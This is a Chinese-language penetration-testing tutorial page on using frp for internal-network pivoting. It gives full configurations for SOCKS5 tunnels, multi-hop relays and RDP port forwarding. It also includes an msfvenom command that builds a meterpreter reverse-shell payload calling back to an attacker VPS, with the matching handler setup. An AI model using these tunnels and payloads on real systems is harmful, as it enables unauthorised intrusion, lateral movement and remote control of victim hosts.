---
title: frp内网渗透应用
description: 详细记录 frp 在内网渗透中的四大典型应用场景：Socks5 隧道搭建、多级隧道串联、代理本地 Metasploit 反弹、以及 RDP
  等服务的远程端口转发，附完整配置示例与拓扑说明。
category: ai-security
tags:
- frp
- 内网穿透
- 内网渗透
- Socks5
- Metasploit
- 端口转发
- 隧道技术
date: 2025-06-15
updated: '2026-11-12'
---

## 概述

**frp (Fast Reverse Proxy)** 是一款专注于内网穿透的高性能反向代理工具，支持 TCP、UDP、HTTP、HTTPS 等协议，采用 **服务端 + 客户端** 架构。在内网渗透中，frp 常被用于**建立隐蔽通信通道、跨网段横向移动、代理攻击框架流量**等场景。本页系统整理四种实战常见用法，均基于 **frps (公网 VPS) + frpc (内网节点)** 的组合拓扑。

> 官方仓库：https://github.com/fatedier/frp

---

## 场景一：单跳 Socks5 隧道

### 适用拓扑
```
攻击机 (公网) ──► frps (VPS) ◄── frpc (Web服务器/跳板) ──► 目标内网资源 (如数据库)
```

### 核心思路
在跳板机器上启动 **frpc + `plugin = socks5`**，将跳板机的 Socks5 代理流量映射到 frps 的 `remote_port`，攻击机仅需配置 `VPS_IP:remote_port` 为 Socks5 代理，即可直达跳板机所在内网段。

### 关键配置

#### frps.ini (VPS)
```ini
[common]
bind_port = 7000
token = shadowtest
```

#### frpc.ini (跳板机 / Web 服务器)
```ini
[common]
server_addr = <VPS_IP>
server_port = 7000
token = shadowtest

[vps_socks]
type = tcp
plugin = socks5
remote_port = 4445
use_encryption = true
```

### 使用方式
1. VPS 启动 `./frps -c frps.ini`
2. 跳板机启动 `./frpc -c frpc.ini`
3. 攻击机浏览器/工具配置 Socks5 代理 → `VPS_IP:4445`
4. 直接访问内网资源（如 `http://10.x.x.x:8080`）

---

## 场景二：多级串联隧道（双跳/多跳）

### 适用拓扑
```
攻击机 ──► frps (VPS) ◄── frpc (Web服务器) ──► frps (Web服务器) ◄── frpc (数据库) ──► OA系统
```
**关键点**：中间节点（Web 服务器）**同时运行 frpc 与 frps**，充当“中继桥梁”。

### 关键配置

#### 第 1 级：VPS (frps)
```ini
[common]
bind_port = 7000
token = shadowtest
```

#### 第 2 级：Web 服务器 (frpc → VPS)
```ini
[common]
server_addr = <VPS_IP>
server_port = 7000
token = shadowtest

[to_vps]
type = tcp
remote_port = 4445
local_port = 4445      # 本地监听，供下一级连接
use_encryption = true
```
> ⚠️ **此处不添加 `plugin = socks5`**，纯 TCP 转发。

#### 第 2 级：Web 服务器 (frps ← 数据库)
```ini
[common]
bind_port = 7000
token = shadowtest
```

#### 第 3 级：数据库 (frpc → Web 服务器)
```ini
[common]
server_addr = <WebServer_IP>
server_port = 7000
token = shadowtest

[to_web]
type = tcp
plugin = socks5
remote_port = 4445     # 映射到 Web 服务器的 4445
use_encryption = true
```

### 流向说明
1. 攻击机代理 `VPS_IP:4445`
2. 流量经 VPS → Web服务器:4445 → 数据库 Socks5 插件 → OA 系统内网

---

## 场景三：代理本地 Metasploit 监听（反向 Shell 落地本地）

### 适用拓扑
```
MSF (攻击机本地) ──► frpc (攻击机) ──► frps (VPS) ◄── frpc (靶机) ──► Payload 执行
```
**优势**：Metasploit 无需部署在 VPS，Handler 留在攻击机本地，仅通过 frp 转发会话流量。

### 关键配置

#### frps.ini (VPS)
```ini
[common]
bind_port = 7000
token = shadowtest
```

#### frpc.ini (攻击机本地)
```ini
[common]
server_addr = <VPS_IP>
server_port = 7000
token = shadowtest

[msf_reverse]
type = tcp
local_ip = 127.0.0.1
local_port = 5555          # MSF Handler 监听端口
remote_port = 4445         # 映射到 VPS 4445
use_encryption = true
```

### MSF 侧设置
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<VPS_IP> LPORT=4445 -f exe > shell.exe
```
```msf
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 5555             # 对应 frpc local_port
run
```

靶机执行 `shell.exe` → 会话回连至攻击机本地 5555。

---

## 场景四：远程端口转发（RDP / SSH 等服务直连）

### 适用拓扑
```
攻击机 (mstsc) ──► VPS:4445 ──► Web服务器:4445 ──► 数据库:4445 ──► OA系统:3389
```
**链式转发**：每级节点同时运行 **frps(收流量) + frpc(转流量)**，最终将目标 3389 映射到攻击机可达的 VPS 端口。

### 逐级配置模板

| 节点角色 | 运行组件 | 关键 `frpc.ini` / `frps.ini` 片段 |
|---|---|---|
| **OA 系统 (目标)** | frpc → 数据库 | `type = tcp`<br>`local_port = 3389`<br>`remote_port = 4445`<br>`server_addr = <DB_IP>` |
| **数据库 (中继)** | frps (收 OA) + frpc → Web | **frps**: `bind_port = 7000`<br>**frpc**: `local_port = 4445`<br>`remote_port = 4445`<br>`server_addr = <Web_IP>` |
| **Web 服务器 (中继)** | frps (收 DB) + frpc → VPS | **frps**: `bind_port = 7000`<br>**frpc**: `local_port = 4445`<br>`remote_port = 4445`<br>`server_addr = <VPS_IP>` |
| **VPS (出口)** | frps | `bind_port = 7000` |

> 所有节点 `token` 保持一致，`use_encryption = true` 建议开启。

### 连接验证
攻击机执行：
```bash
mstsc /v:<VPS_IP>:4445
```
即相当于直连 `OA_IP:3389`。

---

## 通用最佳实践与避坑指南

1. **统一 Token 与加密**  
   所有节点 `token`、`use_encryption`、`use_compression` 保持一致，防止配置不匹配导致连接失败。

2. **端口复用与冲突**  
   多级串联时，中继节点的 `local_port` 与 `remote_port` 常设为同一数值（如 4445），注意避免与本地服务冲突。

3. **防火墙 / 安全组**  
   - VPS 需放行 `bind_port` (默认 7000) 及所有 `remote_port` (示例 4445)  
   - 内网节点需允许出站 7000 及本地监听端口

4. **进程守护**  
   生产环境建议用 `systemd` / `supervisor` / `nssm` 托管 frps/frpc，配置自动重启。

5. **日志与排查**  
   `-l /var/log/frp.log -L info` 记录日志；连接异常时优先检查 **两端日志时间戳对齐**。

6. **版本兼容**  
   客户端/服务端主版本号必须一致（如 v0.58.x ↔ v0.58.x），跨大版本可能协议不兼容。

---

## 相关概念与延伸阅读

- [[内网穿透技术对比]]（对比 frp、nps、ngrok、Cloudflare Tunnel 等）
- [[Socks5 代理链构建]]（结合 proxychains、gost 实现多级代理）
- [[Metasploit 免杀与流量隐藏]]（结合 frp 加密传输规避流量检测）
- [[横向移动凭证导出与利用]]（隧道建立后的后续渗透动作）

---

## 更新记录
| 日期 | 版本 | 说明 |
|---|---|---|
| 2025-06-15 | 1.0 | 初始版本，整理四大核心场景配置与拓扑 |

## 来源

- [007攻防实验室-202007-202010_1](../sources/007攻防实验室-202007-202010_1.md)
